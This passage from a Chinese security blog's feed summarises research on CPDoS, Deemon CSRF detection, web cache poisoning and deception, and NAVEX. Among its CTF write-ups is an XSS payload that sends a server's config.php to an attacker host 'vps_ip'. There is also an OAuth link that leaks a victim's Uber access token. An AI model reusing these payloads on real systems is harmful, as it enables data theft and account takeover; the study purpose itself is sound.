header属性中带有\t，对于Play2后端框架会发生400 Bad Request，而对于CDN Azure，可以正常放行，那么如此一来，攻击即可用\t来攻击Play2+Azure的组合，产生Dos攻击。<br>综上所述，可以发现不同CDN和不同后端的组合可能都会引入安全隐患，以下是总结列表：<br><img src="/images/2020-06-12-18-27-05.png" alt=""><br>我们发现对于使用CDN CloudFront的网站，非常容易受到HMO / HHO / HMC的攻击。而对于Varnish, Akamai, CDN77, Cloudflare或是Fastly则相对安全。<br>与此同时，作者还对真实世界的网站做了测试，查看有多少网站使用较为危险的CDN或中间件：<br><img src="/images/2020-06-12-18-29-13.png" alt=""><br>发现1200万的urls是使用CloudFront，证明HMO / HHO / HMC攻击的可用度比较高。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章基于Server Cache Poisoning的攻击原理，提出了CPDos攻击，可使用三种不同的攻击方式，使一些敏感CDN与web后端组合使用的网站出现DOS攻击，个人认为还是非常不错的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在上一篇文章中，大致介绍了一些关于Web Cache的攻击方式及CTF中的一些出现。而本篇文章则会聚焦于Web Cache在学术前沿的一些攻
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Deemon &amp; Detecting CSRF with Dynamic Analysis and Property Graphs</title>
    <link href="http://skysec.top/2020/05/29/Deemon%20&amp;%20CSRF%E6%BC%8F%E6%B4%9E%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
    <id>http://skysec.top/2020/05/29/Deemon &amp; CSRF漏洞动态分析工具/</id>
    <published>2020-05-29T02:23:34.000Z</published>
    <updated>2020-06-22T07:26:24.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前端的攻击中，一般活跃在大家视线里的可能都是xss居多，对于csrf这一块正好我也抱着学习的心态，了解到安全顶会有一篇自动化挖掘CSRF漏洞的paper，于是看了看，以下是相关知识分享。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CSRF可以分为两种，一种是authenticated CSRF，一种是login CSRF。</p><h3 id="login-CSRF"><a href="#login-CSRF" class="headerlink" title="login CSRF"></a>login CSRF</h3><p>对于login CSRF，这里我们以曾经的价值8000美金的Uber漏洞为例：<br>在网站中，登录流程机制大致如下：<br><img src="/images/2020-05-06-19-28-55.png" alt=""><br>如果我们将somewhere改为google.com，那么流程将变为：<br><img src="/images/2020-05-06-19-29-05.png" alt=""><br>此时可以发现网站存在重定向的漏洞。如果此处我们将<code>response_type=code</code>改为<code>response_type=token</code>:<br><img src="/images/2020-05-06-19-29-13.png" alt=""><br>由于Oauth请求使用的是code并非access_token，所以此处重定向失败。<br>那么此处可以引入login CSRF攻击，为oauth2-callback节点提供有效的code值，那么即可将受害者的access_token带出重定向到我们的网站。<br><img src="/images/2020-05-06-19-29-23.png" alt=""><br>那么只要受害者点击链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://login.uber.com/oauth/authorize?response_type=token&amp;scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3d&#123;攻击者的有效OAuth code&#125;&amp;state=%2F%2f攻击者控制的站点</span><br></pre></td></tr></table></figure></p><p>攻击者即可在网站<code>hackerone.com</code>收到受害者的access_token。</p><h3 id="authenticated-CSRF"><a href="#authenticated-CSRF" class="headerlink" title="authenticated CSRF"></a>authenticated CSRF</h3><p><img src="/images/2020-04-28-11-08-52.png" alt=""><br>对于authenticated CSRF其实容易理解很多，即在用户登录后的页面里插入evil html，这里的方式可以多样化，例如可以利用xss，插入 HTML iframe tag，或者 self-submitting JavaScript code, 又或是使用XMLHttpRequest JavaScript API等等。<br>这里可以以一道CTF题目为例：<a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">https://xssrf.hackme.inndy.tw/</a><br>详细的题解可以参考我这篇文章：<a href="https://skysec.top/2018/08/17/xss-ssrf-redis/">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br>这里我们简单提一下：<br>题目允许攻击者使用xss在发邮件处进行攻击，我们可以发送如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>当受害者访问到该存储性xss会显示的页面，即会自动使用request.php页面，发送post请求，访问file:///var/www/html/config.php，同时会将response重定向发送到我们的攻击服务器：<a href="http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText)，我们即可完成攻击，利用受害者获取一些数据。" target="_blank" rel="noopener">http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText)，我们即可完成攻击，利用受害者获取一些数据。</a></p><h3 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h3><p>两者区别在于authenticated CSRF建立于受害者已经登录授权后的攻击，而login CSRF的目的是让受害者使用攻击者的登录凭证。前者即利用登录后的受害者进行一些需要授权的操作，例如转账等等。而后者更倾向于攻击者利用自己的证书，让受害者登录。<br>而本篇文章中，作者主要研究的是authenticated CSRF的自动化动态分析和挖掘。</p><h2 id="工具设计难题"><a href="#工具设计难题" class="headerlink" title="工具设计难题"></a>工具设计难题</h2><p>在设计中作者遇到了两方面的难题，一个是detection challenges，另一个是operational challenges。</p><h3 id="detection-challenges"><a href="#detection-challenges" class="headerlink" title="detection challenges"></a>detection challenges</h3><ul><li>C1 State Transitions<br>由于在web程序里存在大量的状态转换，例如，用户更改密码后，旧密码不再被使用，此时即是一次状态转换。<br>这样的问题在sql注入或者xss攻击的fuzz工具中可能影响并不是很大，但在CSRF中就会有较多的干扰，所以现在的模型难以直接牵引至aCSRF的fuzz工具中。那么如何确定何时发生状态转换，成为了一个难题。</li><li>C2 Security-Relevant State Changes<br>状态改变的操作很多，但如何识别哪些状态改变是和安全相关的，这成为了一个难题。</li><li>C3 Relationships of Request Parameters and State Transitions<br>例如如下请求：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?newpassword=123123</span><br></pre></td></tr></table></figure></li></ul><p>对于上述链接，工具可能无法知道newpassword这个参数会带来状态转换，这是一个更改密码的操作，且新密码是123123。所以如何确定请求参数和状态转换之间的关系，成为一个难题。</p><h3 id="operational-challenges"><a href="#operational-challenges" class="headerlink" title="operational challenges"></a>operational challenges</h3><ul><li>C4 Transitions in Non-Trivial Application Workflows<br>在Web程序中，经常需要一系列操作后，才能达到更改某个状态的目的，但现有的工具并不能比较好的处理这一系列复杂的操作，静态分析中也存在这样的缺陷。那么如何在较为复杂的web工作流程中找到导致状态变化的请求，成为了一个难题。</li><li>C5 Side-Effect-Free Testing<br>测试中引起的状态变化的副作用是不可逆的，例如在购物车界面，如果我们随机测试，清空了购物车，那么后续的测试将难以进行，这一状态根据现有工具很难逆转。</li><li>C6 Comprehensive, Reusable Representation of Application Functionality<br>在解决aCSRF工具的问题时，会用到许多的模型，但是模型之间可能使用了不同的语言，并且他们之间可能关系复杂，如何将这些模型高效的凝结在一起，使我们可以建立全面的，可重用的应用程序功能表示，成为了一个难题。</li></ul><h2 id="工具设计方法"><a href="#工具设计方法" class="headerlink" title="工具设计方法"></a>工具设计方法</h2><h3 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h3><p>作者为克服上述困难，开发工具基于php后端，mysql数据库的aCSRF自动检测工具：Deemon。</p><ul><li>C1 &amp; C3<br>为了解决C1和C3的难题，Deemon从程序执行观察中推断状态转换和数据流信息的模型。</li><li>C6<br>为了解决C6的难题，Deemon使用属性图来描绘不同模型之间的精准关系。</li><li>C2<br>为了解决C2的问题，Deemon使用图遍历的思想来识别与安全相关的更改操作。</li><li>C4<br>为了解决C4的问题，Deemon在web执行环境中加入一些传感器，并重新生成一组用户操作，用以观察服务器端程序的执行。</li><li>C5<br>最后，为了解决C5的问题，Deemon依赖于虚拟化环境来测试web应用程序，因此可以使用拍摄和恢复快照来解决副作用不可逆的难题。<br>工具需要web应用程序容器和一组用户操作作为输入，且Deemon的执行分为两部分：instrumentation和detection。<br>在instrumentation部分，Deemon会修改web应用程序容器，在其中插入传感器，用于提取网络跟踪、服务端执行流程和数据库操作。而在detection部分，Deemon会自动复制用户的操作，从结果跟踪推断模型，并测试程序中的aCSRF漏洞。<br>那么对于input，我们输入的用户操作，一般是测试人员提供的一组用户操作序列，例如用户在UI界面上的操作，诸如鼠标点击、html表单提交等等，那么这一系列的操作会被转化为input : 用户加载index.php，然后点击更改密码链接，然后输入新的用户密码，点击提交。<br>对于instrumentation部分，由于Deemon是以php为后端所设计，所以其启用了php的Xdebug模块，用以观察程序执行流程和数据操作，同时设计了一个http本地代理，用以观察服务器和浏览器之间的http交换。<br>对于detection部分，Deemon会重复2次用户操作，并利用传感器对数据进行观察，例如查看其数据来源，并判断一些参数是否为随机数等，并从中推断出一个模型，使用模型进行安全测试和漏洞挖掘。</li></ul><h3 id="模型建立"><a href="#模型建立" class="headerlink" title="模型建立"></a>模型建立</h3><ul><li><p>Traces and Parse Trees<br>对于事件发生的顺序和原因，Deemon对其建模，节点为事件Event，其具有两种关系edge:<br>next：事件之间发生的先后顺序<br>causes：事件之间发生的因果关系<br>而对于事件的内容，Deemon也对其建模，其具有2种edge：<br>child：对http request的解析后的内容部分，用child连接节点<br>parses：http请求 / sql查询与事件的解析关系（这实际上是2个model之间的关系了）</p></li><li><p>Finite State Machines<br>Deemon基于有限状态机进行建模，设立了2种节点和3种edge:<br><img src="/images/2020-04-29-14-34-53.png" alt=""><br>State节点代表某一具体状态，StateTrans节点代表中间状态，其中trans代表由某一具体状态转移到中间状态，to代表由中间状态转移到另一具体状态，而accept表示中间状态接受某一HTTP请求从而发生状态转移（这实际上是2个model之间的关系了）。</p></li><li>Dataflow Models<br>Deemon基于数据流对某个变量进行建模，设立了1种节点，3种edge:<br>source：数据的来源<br>propag：数据之间的传递关系<br>sink：数据的最终利用节点<br>同时这里的DFM变量会和FSM状态有关系，即：has，代表某一状态拥有某个数据。<br><img src="/images/2020-04-29-14-58-44.png" alt=""><br>综合上述建模，我们可以看到在如上的请求中，其会被解析到各个model中：<br><img src="/images/2020-04-29-15-00-02.png" alt=""><br>注意到变量会有sem_type标签，该标签含义如下：<br>SU：session unique，如果变量的值在同一session中相同，但在不同session中不同，那么该值的语义类型为SU。<br>UU：user unique，如果变量值在用户追踪中相同，但是在不同用户之间不同，那么该值类型为UU。<br>CO：constant，如果变量值从未改变，全部相同，则该值类型为CO。<br>UG：user-generated ，如果变量值在数据传递propagation chain上，同时是从user action开始的，那么其语义类型为UG。<br>这样的标签可以更好的用来区分哪些是安全相关的变量，哪些是漏洞不关心的变量。</li></ul><h3 id="关系建立"><a href="#关系建立" class="headerlink" title="关系建立"></a>关系建立</h3><p>在模型建立完毕后，为了关联不同的model，作者在这里设定了一些Relationships：<br><img src="/images/2020-05-05-10-22-14.png" alt=""></p><ul><li>Dataflow Information：用来描述状态和变量之间的关系，在 DFM 和 FSM 或者 DFM 和 解析树之间出现。</li><li>Data Propagation：用来描述变量和变量之间的关系，在DFM 和 DFM之间出现。</li><li>Abstractions：描述具体的元素和抽象的元素之间的关系，比如sql查询语句，把里面变量的值删掉，生成抽象语句</li><li>Event Causality：事件发生的因果关系，例如用户点击链接和生成HTTP请求之间可能存在该关系。<br><img src="/images/2020-05-05-10-59-26.png" alt=""></li><li>Accepted Inputs：存在于HTTP请求和状态转换之间，例如一次HTTP请求导致了状态转换，则可以表达为FSM accepts HTTP Request<br><img src="/images/2020-05-05-10-57-52.png" alt=""><br>那么在最后的CSRF漏洞检测时，基于前面的模型，我们可以使用如下的方法：<br><img src="/images/2020-05-06-10-38-23.png" alt=""><br>即关注由一个http请求导致的状态转变问题。结果集如下：<br><img src="/images/2020-05-06-10-39-28.png" alt=""><br>其中q’和q’’是2种状态，tr是状态转换，pt是http请求。<br>此时会引起状态转换的http请求都会出现在Qsc的集合中，但是并非所有请求引起的状态转换都是安全相关的。例如一些数据库操作，记录用户的行为等。那么对于这一类请求，工具会做相应的筛除，这里假设安全不相关的查询可能在一次追踪中发生多次，那么只要找到这些多次的，将其筛除即可。<br>寻找方式如下：<br><img src="/images/2020-05-06-11-20-28.png" alt=""><br>找到所有这样的http请求和sql查询的对，删除AbsSQL传出边数大于1的所有对。因为我们可以认为多个请求都是在操作同一sql语句的，一般都是在做用户活动的log之类的操作。</li></ul><h2 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h2><p>作者从4个应用场景来选择了一些web application进行测试：<br><img src="/images/2020-05-05-11-33-25.png" alt=""><br>为了获取数据和捕获跟踪用于建模，工具会进行下列3种测试：</p><ul><li>只对工作流进行跟踪，不跟踪用户</li><li>对工作流和某个已存在的用户进行操作跟踪</li><li>对相同的工作流和新建立的用户进行操作跟踪<br>首先可以获取到时request请求情况：<br><img src="/images/2020-05-05-11-50-45.png" alt=""><br>其中Reqs代表的是普通的requests请求，SC Reqs代表的是会引起状态改变的requests请求，而Rel SC Reqs代表的是真正引起状态改变的requests请求，有这样的原因是web的大部分request请求都会引起某个状态的改变，但是一般其为用户session的管理，并不是我们关注的安全状态的改变。<br>对于CSRF攻击，我们知道一般可以采用CSRF token进行防御，所以在测试中，遇到了CSRF的保护的情况和没有CSRF的情况可以分为如下两类：<br><img src="/images/2020-05-05-14-40-12.png" alt=""><br>其中TCs的意思为test case，Fail为攻击失败的例子，succ为攻击成功的例子，而Expl代表成功利用的aCSRF漏洞。<br>对于易受攻击的网站，其出现的漏洞如下：<br>1.攻击者可以控制消费者的账户，并且更改其送货地址。该漏洞出现在AbanteCart上。<br>2.攻击者可以控制消费者的账户，并且更改其送货地址，也可以在消费者购物车里添加商品。该漏洞出现在OpenCart上。<br>3.攻击者可以删除网站某些功能服务，同时可以删除收件人。该漏洞出现在Mautic上。<br>4.攻击者可以创建管理员和用户，甚至可以更改开票数据，付款方式等。该漏洞出现在Simple Invoices上。<br>而对于MyBB虽然有成功的case，但是并不能成功写出exp，因为在工具测试中，将管理员的密钥当做了常量，但实际上这个值我们在真实环境中是难以获取到的。</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇CSRF自动化测试的文章，个人认为比较好的部分在于其建模，基于其完善的建模，对于漏洞的挖掘也可以变得高效而简单，值得学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在前端的攻击中，一般活跃在大家视线里的可能都是xss居多，对于csrf这一块正好我也抱着学习的心态，了解到安全顶会有一篇自动化挖掘CSRF漏
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>Web缓存利用分析(一)</title>
    <link href="http://skysec.top/2020/05/14/Web%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90(%E4%B8%80)/"/>
    <id>http://skysec.top/2020/05/14/Web缓存利用分析(一)/</id>
    <published>2020-05-14T02:21:54.000Z</published>
    <updated>2020-06-22T07:25:47.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到一些Web Cache方面的攻击，于是总结了一下，内容如下。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Cache是一种经典的用空间换时间的做法，其应用场景非常广泛，而本篇文章的聚焦点仅在于Web领域上，对于DNS等基础设施的相关cache攻击，也不在此讨论。<br>那么我们可以大致将Web Cache攻击分为2类：</p><ul><li>User Browser Cache</li><li>Web Server Cache<br>对于浏览器，我们知道在请求网站时，会遇到js，css，图片等等的加载，如果每次请求都加载一次，那么可能会消耗许多时间，因此浏览器中可引入Cache机制，用以缓存这些静态资源，以加快访问速度。<br>对于服务器，可能某个网站页面每天要被数以万计的人访问，那么如果每次都处理一次同样的请求，则会消耗大量服务器的资源，因此服务器缓存也显得尤为重要，其中CDN就是Web Server Cache的一个典例：<br><img src="/images/2020-05-07-15-40-45.png" alt=""><br>例如访问链接:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.html</span><br></pre></td></tr></table></figure></li></ul><p>在第一个人访问后，其页面response将会被CDN缓存，下一个请求者则会直接从CDN获取response，以此减轻服务器处理请求的压力，同时达到了防止Dos攻击的目的。如下图示例：<br><img src="/images/2020-05-07-15-41-57.png" alt=""><br>CDN不仅能起到防止Dos的作用，还能加快我们的请求速度，例如我们访问服务器，请求首先会被CDN处理，计算出response给我们的最优ip地址。举一个简单的例子，就好比原来只有北京一个车站卖票，南京的想要买票就要千里迢迢前往北京，而如今有了CDN就好比在南京也有卖票点，如此一来，省时省力，不仅减轻了北京卖票点的压力，也方便了顾客。<br>但凡是皆有利有弊，如果Cache被攻击者利用，也可以产生一些严重的攻击，本篇文章中，我们则聚焦于以下3种攻击：</p><ul><li>User Browser Cache Poisoning</li><li>Server Cache Poisoning</li><li>Web Cache Deception</li></ul><h2 id="User-Browser-Cache-Poisoning"><a href="#User-Browser-Cache-Poisoning" class="headerlink" title="User Browser Cache Poisoning"></a>User Browser Cache Poisoning</h2><p>对于浏览器缓存投毒，那么很好理解，其应该是影响浏览器缓存的文件，将其污染以达到攻击目的。那么可能被污染的文件有哪些呢？我们之前提过，浏览器一般缓存静态资源，那么攻击者的攻击目标也就是诸如JS、CSS的静态资源了。<br>这种攻击会产生什么样的危害呢？<br><img src="/images/2020-05-07-15-46-49.png" alt=""><br><img src="/images/2020-05-07-15-46-59.png" alt=""><br>我们可以看到，一旦我们的浏览器缓存资源被污染，当我们请求网站时，应用了污染的静态资源，则会产生xss一类的攻击。但这种攻击持久性会随缓存时间的到期而终止，又或者用户勤清缓存而解除。<br>但这样一种攻击是如何实现的呢？我们可以看下图：<br><img src="/images/2020-05-07-15-48-41.png" alt=""><br>当攻击者和受害者处于同一WiFi下，攻击者可以利用一些攻击手段，让自己成为受害者的代理，而当受害者请求目标网站资源时，攻击者可在中间修改。当目标网站response需要缓存的资源时，攻击者可将其替换为自己篡改的同名文件，以达到污染浏览器缓存的目的。<br>但考虑到缓存存在时效性，如果目标网站认为缓存过期，则污染缓存就会失效，因此如何最大化污染缓存时间成为一个新的问题，但这里我们可以采用如下做法：<br><img src="/images/2020-05-07-15-51-13.png" alt=""><br>我们可以首先对一些知名网站进行分析，查看他们缓存时间最长的文件，以决定我们污染文件的文件名。那么如何知道缓存时间呢？我们可利用Http Header的如下属性来查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control : max-age=1000</span><br></pre></td></tr></table></figure></p><p>如此一来即可水到渠成，进行用户浏览器污染。工具如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EtherDream/mitm-http-cache-poisoning.git</span><br></pre></td></tr></table></figure></p><h2 id="Server-Cache-Poisoning"><a href="#Server-Cache-Poisoning" class="headerlink" title="Server Cache Poisoning"></a>Server Cache Poisoning</h2><p>在介绍完用户浏览器投毒后，我们再来看一下服务器缓存投毒。之前我们有说过，服务器会缓存某个链接的第一个访问者的response内容，那么如果第一个人是攻击者，就很有可能让CDN错误的缓存污染内容，达成攻击：<br><img src="/images/2020-05-07-15-55-04.png" alt=""><br>但是服务器是如何判断2个请求者请求的是不是同一个页面呢？这里就要引入Cache Key的概念：<br><img src="/images/2020-05-07-15-55-41.png" alt=""><br>如上请求，服务器会判断橙色字部分，看其是否相同，若相同则对应同一个cache，但我们不难发现蓝色字体部分，此时2个访问者的response理应不同，因为他们对应的不同语言，但因为缓存机制的问题，导致第2个请求者看到了错误语言的页面。<br>再同理，我们看如下请求：<br><img src="/images/2020-05-07-15-57-27.png" alt=""><br>我们发现response页面中会拼接X-Forwarded-Host，那么假设我们是第一个请求者，此response将会被缓存，那么当下一个请求者再次访问如下链接：<br><img src="/images/2020-05-07-15-57-36.png" alt=""><br>很显然其将受到xss的攻击。<br>但是此类攻击有一个前提，即我们需要是第一个请求某个页面的人，那么如何做到这一点呢？<br><img src="/images/2020-05-07-15-59-50.png" alt=""><br>我们可以利用response里的Age和max-age，Age代表当前response的时间，而max-age代表该页面缓存何时会过期，以此我们即可计算出投毒时机。<br>那么如何保护网站免收此类攻击呢？这就要和我们之前提到的cache key有关，我们看如下请求：<br><img src="/images/2020-05-07-16-01-38.png" alt=""><br>如果我们利用Vary指定Cache Key为User-Agent，那么不仅需要2个访问者请求域名和url相同，同时需要2人拥有同样的User-Agent，才会命中同一块cache。</p><h2 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception"></a>Web Cache Deception</h2><p>在说完Web Server缓存投毒后，我们再来看一下Web缓存欺骗。相较于前两种攻击，该攻击更为普遍，利用也相对容易。不乏其在CTF中出现的频频身影。<br><img src="/images/2020-05-07-16-04-13.png" alt=""><br>我们看如上案例，我们可以诱导管理员访问链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p><p>而服务器在处理该链接时，由于test.css不存在，其会向前解析，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php</span><br></pre></td></tr></table></figure></p><p>此时response页面即为secret.php的页面内容，而CDN对此不知，其认为当请求链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p><p>response应为管理员的secret.php页面内容。<br>而后攻击者再次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p><p>CDN将作出响应，将管理员的secret.php页面内容返回，造成信息泄露。<br>那么此种攻击在2019 CyBRICS CTF Quals或2019 XCTF Final都有出现，我们以2019 CyBRICS CTF Quals的一道题为例：<br><img src="/images/2020-05-07-16-10-07.jpg" alt=""><br>题目预设了request功能，同时注意到其http header：<br><img src="/images/2020-05-07-16-10-43.jpg" alt=""><br>同时结合题目提示：cache is vulnerabilities，那么可以判断此处应该为Web缓存欺骗的情况。<br>我们需要利用request功能，让其去请求flag页面，再利用缓存信息将内容带出。<br>因此我们首先可以读取主页内容，这里构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js</span><br></pre></td></tr></table></figure></p><p>此时缓存将会将此url记录，对应内容则为index.php的内容。<br>然后我们再次访问该链接，即可获取index.php内容：<br><img src="/images/2020-05-07-16-12-38.jpg" alt=""><br>那么再让题目携带csrf-token去请求flag即可：<br><img src="/images/2020-05-07-16-13-04.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd%26flag=1</span><br></pre></td></tr></table></figure></p><p>此时再请求缓存页面，即可获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://drops.xmd5.com/static/drops/tips-9947.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-9947.html</a><br><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#Fixaref">https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#Fixaref</a><br><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf</a><br><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近看到一些Web Cache方面的攻击，于是总结了一下，内容如下。&lt;/p&gt;
&lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; c
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</title>
    <link href="http://skysec.top/2020/05/05/Paper%20Summary%20&amp;%20NAVEX-Precise%20and%20Scalable%20Exploit%20Generation%20for%20Dynamic%20Web%20Applications/"/>
    <id>http://skysec.top/2020/05/05/Paper Summary &amp; NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/</id>
    <published>2020-05-05T02:23:34.000Z</published>
    <updated>2020-06-22T07:26:11.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次介绍的是一篇发表在安全顶会2018 USENIX Security的paper，文章旨在自动化挖掘web漏洞，同时生成对应的exp，其比同类的工具拥有更高的准确度，由于其动静结合的特性，对代码也有更好的覆盖率。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先我们从如下这样一个例子切入，来简单介绍一下web漏洞自动挖掘和通常一些静态分析的工具的做法。<br>例如如下3个代码片段：<br>selectBooks.php用于选择你想要借的书，代码如下：<br><img src="/images/2020-03-22-17-48-21.png" alt=""><br>hold.php用于额外的check输入，并引导用户到下一步操作，代码如下：<br><img src="/images/2020-03-22-17-48-59.png" alt=""><br>checkout.php用于结算，代码如下：<br><img src="/images/2020-03-22-17-49-23.png" alt=""><br>我们可以看到，在这样一个简单的功能实现上，其实出现了不少潜在的漏洞函数，例如selectBooks.php中的mysql_query可能会导致sql注入，又如checkout.php中的echo可能会导致XSS漏洞。<br>那么对于一些常规的静态分析漏洞挖掘工具，他们会怎么做呢？一般情况下，其会首先全局定位到漏洞函数的位置，例如selectBooks.php的第17行，checkout.php的第15行，然后对其参数利用PDG(数据依赖)的关系进行backward反向回溯。<br>例如selectBooks.php的第17行，我们使用PDG关系回溯，可以发现其影响的关键参数有3个，分别是$book_name，$edition,$publisher。他们又分别来自第5行，第9行和第13行。此时我们又会继续对第5行，第9行和第13行继续进行PDG回溯，而后发现他们都会经过过滤函数，那么此时回溯结束，静态分析工具粗略的判断其为安全的flow，因为其参数都会经过过滤。<br>我们再看checkout.php的第15行，利用PDG进行回溯，我们可以关注到2个变量，分别是$name和$msg，而后找到第 